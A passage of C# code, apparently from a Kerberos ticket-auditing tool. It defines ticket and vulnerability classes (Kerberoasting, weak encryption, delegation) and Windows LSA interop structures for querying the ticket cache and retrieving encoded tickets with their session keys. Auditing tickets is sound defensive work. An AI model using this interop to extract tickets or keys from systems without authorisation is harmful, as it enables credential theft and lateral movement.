    public class CachedTicket
    {
        public string FilePath { get; set; }
        public long FileSize { get; set; }
        public DateTime CreationTime { get; set; }
        public DateTime LastWriteTime { get; set; }
        public string TicketFormat { get; set; }
        public byte[] TicketData { get; set; }
        public string Base64Ticket { get; set; }
        public KerberosTicket ParsedTicket { get; set; }
    }

    public class KerberosVulnerability
    {
        public VulnerabilityType Type { get; set; }
        public string Severity { get; set; }
        public string Description { get; set; }
        public string TicketType { get; set; }
        public string Principal { get; set; }
        public string Recommendation { get; set; }
    }

    public enum EncryptionType
    {
        DES_CBC_CRC = 1,
        DES_CBC_MD4 = 2,
        DES_CBC_MD5 = 3,
        DES3_CBC_MD5 = 5,
        DES3_CBC_SHA1 = 7,
        DSAWITHSHA1_CMSOID = 9,
        MD5WITHRSAENCRYPTION_CMSOID = 10,
        SHA1WITHRSAENCRYPTION_CMSOID = 11,
        RC2CBC_ENVOID = 12,
        RSAENCRYPTION_ENVOID = 13,
        RSAES_OAEP_ENV_OID = 14,
        DES_EDE3_CBC_ENV_OID = 15,
        DES3_CBC_SHA1_KD = 16,
        AES128_CTS_HMAC_SHA1_96 = 17,
        AES256_CTS_HMAC_SHA1_96 = 18,
        RC4_HMAC_MD5 = 23,
        RC4_HMAC_MD5_EXP = 24
    }

    [Flags]
    public enum TicketFlags : uint
    {
        Reserved = 0x80000000,
        Forwardable = 0x40000000,
        Forwarded = 0x20000000,
        Proxiable = 0x10000000,
        Proxy = 0x08000000,
        MayPostdate = 0x04000000,
        Postdated = 0x02000000,
        Invalid = 0x01000000,
        Renewable = 0x00800000,
        Initial = 0x00400000,
        PreAuthent = 0x00200000,
        HwAuthent = 0x00100000,
        OkAsDelegate = 0x00040000,
        NameCanonicalize = 0x00010000,
        EncPaRep = 0x00010000
    }

    public enum VulnerabilityType
    {
        WeakEncryption,
        LongLivedTicket,
        Kerberoasting,
        PrivilegedService,
        UnconstrainedDelegation
    }

    internal static class NativeMethods
    {
        [DllImport("kernel32.dll")]
        public static extern uint GetCurrentSessionId();

        [DllImport("secur32.dll")]
        public static extern int LsaConnectUntrusted(out IntPtr lsaHandle);

        [DllImport("secur32.dll")]
        public static extern int LsaLookupAuthenticationPackage(IntPtr lsaHandle, ref LSA_STRING packageName, out uint authenticationPackage);

        [DllImport("secur32.dll")]
        public static extern int LsaCallAuthenticationPackage(IntPtr lsaHandle, uint authenticationPackage, IntPtr protocolSubmitBuffer, uint submitBufferLength, out IntPtr protocolReturnBuffer, out uint returnBufferLength, out int protocolStatus);

        [DllImport("secur32.dll")]
        public static extern int LsaDeregisterLogonProcess(IntPtr lsaHandle);

        [DllImport("secur32.dll")]
        public static extern int LsaFreeReturnBuffer(IntPtr buffer);

        [StructLayout(LayoutKind.Sequential)]
        public struct LSA_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;

            public LSA_STRING(string s)
            {
                Length = (ushort)s.Length;
                MaximumLength = (ushort)s.Length;
                Buffer = Marshal.StringToHGlobalAnsi(s);
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LSA_UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;

            public LSA_UNICODE_STRING(string s)
            {
                Length = (ushort)(s.Length * 2);
                MaximumLength = (ushort)(s.Length * 2);
                Buffer = Marshal.StringToHGlobalUni(s);
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LUID
        {
            public uint LowPart;
            public int HighPart;
        }

        public enum KERB_PROTOCOL_MESSAGE_TYPE
        {
            KerbQueryTicketCacheMessage = 14,
            KerbRetrieveTicketMessage = 8
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KERB_QUERY_TKT_CACHE_REQUEST
        {
            public KERB_PROTOCOL_MESSAGE_TYPE MessageType;
            public LUID LogonId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KERB_QUERY_TKT_CACHE_RESPONSE
        {
            public KERB_PROTOCOL_MESSAGE_TYPE MessageType;
            public int CountOfTickets;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KERB_TICKET_CACHE_INFO
        {
            public LSA_UNICODE_STRING ServerName;
            public LSA_UNICODE_STRING RealmName;
            public long StartTime;
            public long EndTime;
            public long RenewTime;
            public int EncryptionType;
            public uint TicketFlags;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KERB_RETRIEVE_TKT_REQUEST
        {
            public KERB_PROTOCOL_MESSAGE_TYPE MessageType;
            public LUID LogonId;
            public LSA_UNICODE_STRING TargetName;
            public uint TicketFlags;
            public uint CacheOptions;
            public int EncryptionType;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KERB_RETRIEVE_TKT_RESPONSE
        {
            public KERB_EXTERNAL_TICKET Ticket;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KERB_EXTERNAL_TICKET
        {
            public IntPtr ServiceName;
            public IntPtr TargetName;
            public IntPtr ClientName;
            public LSA_UNICODE_STRING DomainName;
            public LSA_UNICODE_STRING TargetDomainName;
            public LSA_UNICODE_STRING AltTargetDomainName;
            public KERB_CRYPTO_KEY SessionKey;
            public uint TicketFlags;
            public uint Flags;
            public long KeyExpirationTime;
            public long StartTime;
            public long EndTime;
            public long RenewUntil;
            public long TimeSkew;
            public uint EncodedTicketSize;
            public IntPtr EncodedTicket;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KERB_CRYPTO_KEY
        {
            public int KeyType;
            public uint Length;
            public IntPtr Value;
        }
    }
}